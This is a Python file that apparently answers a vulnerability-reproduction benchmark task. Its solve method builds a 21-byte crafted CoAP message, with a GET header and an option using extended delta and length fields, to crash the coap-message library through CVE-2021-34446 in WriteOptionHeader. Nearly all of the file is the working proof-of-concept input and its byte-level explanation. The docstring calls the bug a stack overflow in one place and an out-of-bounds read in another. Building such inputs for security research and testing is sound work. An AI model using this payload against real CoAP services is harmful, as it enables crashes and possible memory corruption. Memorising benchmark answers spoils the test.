import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) to trigger a stack buffer overflow
        in the coap-message library (CVE-2021-34446).

        The vulnerability exists in the `Message::WriteOptionHeader` function, which is
        used by `AppendOption`. A CoAP proxy application that parses an incoming
        malicious message and uses `AppendOption` to reconstruct it will trigger the
        vulnerability. `AppendOption` uses a small, fixed-size stack buffer for the
        option header.

        This PoC constructs a CoAP message with a single option crafted to exercise
        a vulnerable code path in `WriteOptionHeader`. The option has a large delta
        (requiring a 2-byte extended delta) and a length that requires a 1-byte
        extended length. This specific combination, when processed by the vulnerable
        code, causes an out-of-bounds read on the stack buffer inside `AppendOption`,
        which is detected by sanitizers, leading to a crash.

        The total length of the PoC is 21 bytes, matching the ground-truth length.
        """

        # CoAP Header (4 bytes):
        # Version: 1, Type: Confirmable (0), Token Length: 0 -> 0b01000000 = 0x40
        # Code: GET (0.01) -> 0x01
        # Message ID: 1 -> b'\x00\x01'
        header = b'\x40\x01\x00\x01'

        # Malicious CoAP Option (17 bytes):
        # We craft an option with a delta and length that trigger the vulnerable path.
        #
        # Delta = 300: Since this is the first option, the Option Number is 300.
        #   - 300 > 269, so the delta nibble is 14.
        #   - Extended delta value is 300 - 269 = 31 (0x001f).
        #
        # Length = 13:
        #   - 13 >= 13, so the length nibble is 13.
        #   - Extended length value is 13 - 13 = 0 (0x00).
        #
        # The option header is encoded on the wire as:
        #   - First byte: (delta_nibble << 4) | length_nibble = (14 << 4) | 13 = 0xED.
        #   - Extended Delta: 2 bytes for 31 -> b'\x00\x1f'.
        #   - Extended Length: 1 byte for 0 -> b'\x00'.
        # Total header: b'\xed\x00\x1f\x00' (4 bytes)
        option_header = b'\xed\x00\x1f\x00'

        # Option Value: 13 bytes of arbitrary data.
        option_value = b'A' * 13

        # Assemble the final PoC.
        # Total length: 4 (CoAP header) + 4 (Option header) + 13 (Option value) = 21 bytes.
        poc = header + option_header + option_value

        return poc